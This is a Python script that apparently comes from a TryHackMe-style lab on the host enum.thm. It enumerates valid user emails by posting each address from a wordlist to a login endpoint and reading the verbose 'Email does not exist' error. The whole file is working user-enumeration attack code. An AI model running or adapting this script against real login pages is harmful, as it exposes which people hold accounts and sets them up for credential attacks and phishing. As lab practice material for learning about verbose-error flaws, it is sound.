import requests
import sys


def check_email(email):
    # Location of the login function
    url = 'http://enum.thm/labs/verbose_login/functions.php'

    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }

    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data, timeout=10)

    return response.json()


def enumerate_emails(email_file):
    valid_email = []
    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()

        if email:
            response_json = check_email(email)

            if response_json.get("status") == "error" and response_json.get("message") == "Email does not exist":
                print(f"[Invalid] {email}")

            else:
                print(f"[Valid] {email}")
                valid_email.append(email)

    return valid_email


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
